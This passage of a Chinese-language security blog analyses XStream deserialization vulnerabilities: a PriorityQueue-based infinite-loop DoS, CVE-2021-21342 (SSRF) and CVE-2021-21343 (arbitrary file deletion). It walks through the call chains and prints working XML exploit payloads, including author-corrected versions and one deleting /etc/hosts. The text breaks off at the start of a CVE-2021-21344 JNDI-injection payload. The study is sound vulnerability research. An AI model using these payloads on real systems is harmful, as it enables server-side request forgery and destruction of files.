<p>在这里，pos赋值为了int类型的最小值，而count为0，在计算机中，对于四个字节的int类型来说，0减去-2147483648，也就是-2147483648按位取反加一，-2147483648转换为二进制为1000 0000 0000 0000 0000 0000 0000 0000，按位取反后为：0111 1111 1111 1111 1111 1111 1111 1111然后加1，即为原来的1000 0000 0000 0000 0000 0000 0000 0000。也就是说0减去最小值得到的仍为最小值，所以上图的avail变量的值为-2147483648，len为0，它大于avail，所以将最小值赋给了len，然后由于len小于0，所以返回0。返回到readFrom方法中，所以sz为0，后续count+sz依旧是0+0为0，下一次循环进入read方法，仍然是0减去最小值，然后赋值给len属性，接着返回0，造成了死循环。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091558957.png" alt="image-20230409155836905"></p>
<p>对于POC的其他疑问：</p>
<p>POC为什么要有<code>&lt;int&gt;3&lt;/int&gt;</code>标签？</p>
<p>因为在readObject中他需要读取一个int值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082356976.png" alt="image-20230408235609894"></p>
<p>POC为什么有两个Base64Data标签？</p>
<p>因为我们设置size为2，所以需要有两个对象存入队列中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082355244.png" alt="image-20230408235511178"></p>
<p>那size不能设置成1吗，那不就只需要一个Base64Data标签了？</p>
<p>因为在heapify方法里，size必须大于等于2，否则无法调用siftDown方法触发后续利用链。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082358599.png" alt="image-20230408235807545"></p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>PriorityQueue的readObject中将Base64Data类实例存入队列，后续siftDownUsingComparator方法触发ObservableList$1的compare方法，在compare方法里又连接到了Base64Data类实例，触发Base64Data类实例的toString方法，后续为常规利用链了。</p>
<p>关键地方：siftDownUsingComparator方法连接ObservableList$1，compare方法连接Base64Data</p>
<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>后续的漏洞修复都是升级版本，不再赘述。</p>
<h2 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>此漏洞造成SSRF，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">                &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>官方给的POC会报空指针异常，未达到sink，所以我修正了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;satellites /&gt;</span><br><span class="line">            &lt;invocationProperties /&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">                &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>加了两个必要的属性satellites、invocationProperties就可以SSRF了。</p>
<p>仍然使用PriorityQueue的readObject作入口点，触发comparator的compare方法，在IndexOrderComparator的compare方法中，调用了compareIndices方法，将indexMap作为第一个参数传入，indexMap已经赋值为ResponseContext实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091646511.png" alt="image-20230409164608444"></p>
<p>在compareIndices方法中，调用了ResponseContext实例的get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091647452.png" alt="image-20230409164722395"></p>
<p>在get方法中，调用getMessage方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091648546.png" alt="image-20230409164825485"></p>
<p>在getMessage方法，将message属性封装为MessageWrapper类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091649235.png" alt="image-20230409164919165"></p>
<p>其实就是将message的值（XMLMessage$XMLMultiPart类实例）赋给了delegate属性：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091650300.png" alt="image-20230409165014230"></p>
<p>回到上层，将封装好的MessageWrapper类实例返回：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091649235.png" alt="image-20230409164919165"></p>
<p>然后调用getAttachments方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091651704.png" alt="image-20230409165127647"></p>
<p>调用delegate属性（XMLMessage$XMLMultiPart类实例）的getAttachments方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091651777.png" alt="image-20230409165158724"></p>
<p>接着调用getMessage方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091653666.png" alt="image-20230409165326605"></p>
<p>在getMessage方法中，调用dataSource属性（URLDataSource类实例）的getInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091654202.png" alt="image-20230409165411113"></p>
<p>在URLDataSource类实例的getInputStream方法中，直接进行url的连接，造成SSRF：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091655912.png" alt="image-20230409165502853"></p>
<h2 id="CVE-2021-21343"><a href="#CVE-2021-21343" class="headerlink" title="CVE-2021-21343"></a>CVE-2021-21343</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成任意文件删除，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource&#x27;&gt;</span><br><span class="line">                &lt;part&gt;</span><br><span class="line">                  &lt;dataHead&gt;</span><br><span class="line">                    &lt;tail/&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;data class=&#x27;com.sun.xml.internal.org.jvnet.mimepull.MemoryData&#x27;&gt;</span><br><span class="line">                        &lt;len&gt;3&lt;/len&gt;</span><br><span class="line">                        &lt;data&gt;AQID&lt;/data&gt;</span><br><span class="line">                      &lt;/data&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/dataHead&gt;</span><br><span class="line">                  &lt;contentTransferEncoding&gt;base64&lt;/contentTransferEncoding&gt;</span><br><span class="line">                  &lt;msg&gt;</span><br><span class="line">                    &lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                      &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                      &lt;lastRet&gt;1&lt;/lastRet&gt;</span><br><span class="line">                      &lt;expectedModCount&gt;4&lt;/expectedModCount&gt;</span><br><span class="line">                        &lt;outer-class&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                        &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/it&gt;</span><br><span class="line">                    &lt;in class=&#x27;java.io.FileInputStream&#x27;&gt;</span><br><span class="line">                      &lt;fd/&gt;</span><br><span class="line">                      &lt;channel class=&#x27;sun.nio.ch.FileChannelImpl&#x27;&gt;</span><br><span class="line">                        &lt;closeLock/&gt;</span><br><span class="line">                        &lt;open&gt;true&lt;/open&gt;</span><br><span class="line">                        &lt;threads&gt;</span><br><span class="line">                          &lt;used&gt;-1&lt;/used&gt;</span><br><span class="line">                        &lt;/threads&gt;</span><br><span class="line">                        &lt;parent class=&#x27;sun.plugin2.ipc.unix.DomainSocketNamedPipe&#x27;&gt;</span><br><span class="line">                          &lt;sockClient&gt;</span><br><span class="line">                            &lt;fileName&gt;/etc/hosts&lt;/fileName&gt;</span><br><span class="line">                            &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">                          &lt;/sockClient&gt;</span><br><span class="line">                          &lt;connectionSync/&gt;</span><br><span class="line">                        &lt;/parent&gt;</span><br><span class="line">                      &lt;/channel&gt;</span><br><span class="line">                      &lt;closeLock/&gt;</span><br><span class="line">                    &lt;/in&gt;</span><br><span class="line">                  &lt;/msg&gt;</span><br><span class="line">                &lt;/part&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这个调用链非常复杂，估计是用了什么自动化工具找的，简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource&#x27;&gt;</span><br><span class="line">                &lt;part&gt;</span><br><span class="line">                  &lt;dataHead&gt;</span><br><span class="line">                    &lt;tail/&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;data class=&#x27;com.sun.xml.internal.org.jvnet.mimepull.MemoryData&#x27;&gt;</span><br><span class="line">                        &lt;len&gt;3&lt;/len&gt;</span><br><span class="line">                        &lt;data&gt;AQID&lt;/data&gt;</span><br><span class="line">                      &lt;/data&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/dataHead&gt;</span><br><span class="line">                  &lt;contentTransferEncoding&gt;base64&lt;/contentTransferEncoding&gt;</span><br><span class="line">                  &lt;msg&gt;</span><br><span class="line">                    &lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                      &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                        &lt;outer-class&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                        &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/it&gt;</span><br><span class="line">                    &lt;in class=&#x27;java.io.FileInputStream&#x27;&gt;</span><br><span class="line">                      &lt;channel class=&#x27;sun.nio.ch.FileChannelImpl&#x27;&gt;</span><br><span class="line">                        &lt;closeLock/&gt;</span><br><span class="line">                        &lt;open&gt;true&lt;/open&gt;</span><br><span class="line">                        &lt;threads&gt;</span><br><span class="line">                          &lt;used&gt;-1&lt;/used&gt;</span><br><span class="line">                        &lt;/threads&gt;</span><br><span class="line">                        &lt;parent class=&#x27;sun.plugin2.ipc.unix.DomainSocketNamedPipe&#x27;&gt;</span><br><span class="line">                          &lt;sockClient&gt;</span><br><span class="line">                            &lt;fileName&gt;D:/1.txt&lt;/fileName&gt;</span><br><span class="line">                            &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">                          &lt;/sockClient&gt;</span><br><span class="line">                        &lt;/parent&gt;</span><br><span class="line">                      &lt;/channel&gt;</span><br><span class="line">                      &lt;closeLock/&gt;</span><br><span class="line">                    &lt;/in&gt;</span><br><span class="line">                  &lt;/msg&gt;</span><br><span class="line">                &lt;/part&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>其实也没删掉多少属性，和上一条链的区别在于dataSource属性变了，由URLDataSource变成了StreamingDataSource，上一条链在getMessage方法中通过getInputStream方法触发SSRF，而这一条链在getContentType方法中触发任意文件删除，进入getContentType方法中查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091755673.png" alt="image-20230409175532582"></p>
<p>这里的part属性在xml中未指定类型，则使用默认的MIMEPart，调用MIMEPart的getContentType方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091757519.png" alt="image-20230409175701470"></p>
<p>因为contentType在xml中未进行赋值，所以为null，然后调用getHeaders方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091758489.png" alt="image-20230409175831411"></p>
<p>同样在xml中未给headers属性赋值，所以为null，而msg在xml中写出来了，就会实例化为属性赋值，msg采用默认类型MIMEMessage，调用MIMEMessage的makeProgress方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091759567.png" alt="image-20230409175929480"></p>
<p>在makeProgress方法中，我们在xml中已经为ArrayList中存入了值，所以it.hasNext()为true，存值对应的xml如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">  &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">    &lt;outer-class&gt;</span><br><span class="line">      &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">    &lt;/outer-class&gt;</span><br><span class="line">&lt;/it&gt;</span><br></pre></td></tr></table></figure>

<p>进入else分支：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091802658.png" alt="image-20230409180226556"></p>
<p>在else分支中，获取了事件类型，由于我们存入的为END_MESSAGE事件，所以进入END_MESSAGE分支，在END_MESSAGE分支中调用了in.close（FileInputStream.close()）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091802554.png" alt="image-20230409180248471"></p>
<p>在close方法中，调用了channel的close方法，同时channel我们也赋值为了FileChannelImpl类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091807746.png" alt="image-20230409180749659"></p>
<p>可惜啊FileChannelImpl类实例没有close方法，只能找他的父类AbstractInterruptibleChannel的close方法了，在父类的close方法中，调用了implCloseChannel方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091811685.png" alt="image-20230409181117620"></p>
<p>同样在xml中将parent属性赋值为了DomainSocketNamedPipe类实例，所以调用DomainSocketNamedPipe类实例的close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091812411.png" alt="image-20230409181204348"></p>
<p>由于sockClient不为null，所以会调用它的close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091813634.png" alt="image-20230409181310550"></p>
<p>sockClient赋值信息如下，未指定类型，默认为UnixDomainSocket类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;sockClient&gt;</span><br><span class="line">  &lt;fileName&gt;D:/1.txt&lt;/fileName&gt;</span><br><span class="line">  &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">&lt;/sockClient&gt;</span><br></pre></td></tr></table></figure>

<p>在close方法中，new一个文件，然后把文件删除：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091815333.png" alt="image-20230409181518231"></p>
<p>至此分析完毕，调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">com.sun.deploy.net.socket.UnixDomainSocket.close</span><br><span class="line">sun.plugin2.ipc.unix.DomainSocketNamedPipe.close</span><br><span class="line">sun.nio.ch.FileChannelImpl.implCloseChannel</span><br><span class="line">java.nio.channels.spi.AbstractInterruptibleChannel.close</span><br><span class="line">at java.io.FileInputStream.close</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getHeaders</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getContentType</span><br><span class="line">com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource.getContentType</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getAttachments</span><br><span class="line">com.sun.xml.internal.ws.api.message.MessageWrapper.getAttachments</span><br><span class="line">com.sun.xml.internal.ws.client.ResponseContext.get</span><br><span class="line">sun.awt.datatransfer.DataTransferer$IndexedComparator.compareIndices</span><br><span class="line">sun.awt.datatransfer.DataTransferer$IndexOrderComparator.compare</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">java.util.PriorityQueue.readObject(PriorityQueue.java:796)</span><br><span class="line">...</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">com.thoughtworks.xstream.core.util.SerializationMembers.callReadObject</span><br><span class="line">com.thoughtworks.xstream.converters.reflection.SerializableConverter.doUnmarshal</span><br><span class="line">com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convert</span><br><span class="line">com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.start</span><br><span class="line">com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.fromXML</span><br><span class="line">com.thoughtworks.xstream.XStream.fromXML</span><br><span class="line">org.example.Main.main</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞能造成JNDI注入，官方给的POC：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 